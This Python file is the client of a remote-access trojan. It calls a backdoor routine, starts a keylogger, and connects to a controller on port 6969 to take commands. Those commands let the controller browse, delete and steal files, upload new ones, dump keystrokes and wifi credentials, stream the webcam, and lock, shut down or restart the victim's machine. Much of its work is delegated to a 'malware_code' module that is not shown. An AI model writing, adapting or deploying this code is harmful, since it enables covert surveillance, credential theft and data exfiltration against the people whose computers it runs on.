import socket, malware_code
from time import time
from time import sleep
from struct import pack
from pickle import dumps
from os.path import getsize
from getpass import getuser
from cv2 import VideoCapture

malware_code.backdoor()
malware_code.start_logging()


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ips = ['127.0.0.1']
stop = False
while True:
    for ip in ips:
        try:
            connection.connect((ip, 6969))
            stop = True
            break
        except:
            pass
    if stop:
        break

# 1. Webcam recording *
# 2. Screen recording
# 3. Check upload for port forwarding

def webcam():
    print('35')

    timeout = 9999999999999999 #runs for 9 quadrillion seconds (31,688,087 years)
    timeout_start = time()
    print('13')

    cap = VideoCapture(0)
    print('3')

    while time() < timeout_start + timeout:
        print('32')

        frame = cap.read()
        data = dumps(frame)
        connection.sendall(pack("L", len(data)) + data)
    cap.release()

def download(recv):
    name = malware_code.parameter_finder(recv)
    size = getsize(name)
    connection.send(f'{str(size)},{name}'.encode())
    connection.recv(1024)
    with open(name, "rb") as f:
        file_data = f.read(size)
        while file_data:
            connection.send(file_data)
            file_data = f.read(size)
            sleep(2)
            connection.send(b"DONE")

def upload():
    recv = connection.recv(1024).decode().split(',')
    size = int(recv[0])
    name = recv[1]
    connection.send('0'.encode())
    with open(name, "wb") as f:
        read_data = connection.recv(size)
        while read_data:
            f.write(read_data)
            read_data = connection.recv(size)
            if read_data == b"DONE":
                break

while True:
    try:
        recv = connection.recv(1024).decode()
        print(recv)
        if recv == 'ls':
            connection.send(malware_code.ls().encode())
        elif recv.find('cd') == 0:
            connection.send(malware_code.changedir(recv).encode())
        elif recv.find('open') == 0:
            connection.send(malware_code.openfile(recv).encode())
        elif recv == 'keylogger start':
            connection.send(malware_code.keylogger_start().encode())
        elif recv == 'keylogger dump':
            current = malware_code.pwd()
            malware_code.changedir(f'cd "C:\\Users\\{getuser()}"')
            download('download w.txt')
            malware_code.changedir(f'cd "{current}"')
        elif recv.find('download') == 0:
            download(recv)
        elif recv.find('upload') == 0:
            connection.send('1'.encode())
            upload()
        elif recv.find('rename') == 0:
            connection.send(malware_code.rename_file(recv).encode())
        elif recv == 'pwd':
            connection.send(malware_code.pwd().encode())
        elif recv.find('mkdir') == 0:
            connection.send(malware_code.mkd(recv).encode())
        elif recv.find('rmd') == 0:
            connection.send(malware_code.rmd(recv).encode())
        elif recv.find('rm') == 0:
            connection.send(malware_code.rm(recv).encode())
        elif recv == 'lock':
            connection.send(malware_code.lock().encode())
        elif recv == 'shutdown':
            malware_code.shutdown()
        elif recv == 'restart':
            malware_code.restart()
        elif recv == 'wifi dump':
            connection.send(malware_code.wifi_dump().encode())
        elif recv.find('touch') == 0:
            connection.send(malware_code.touchf(recv).encode())
        elif recv == 'info':
            connection.send(malware_code.info().encode())
        elif recv == 'webcam':
            webcam()
        elif recv == 'help':
            connection.send(malware_code.help().encode())
        else:
            connection.send("Command not found".encode())
    except Exception as err:
        connection.send(f'Error: {err}'.encode())
        pass
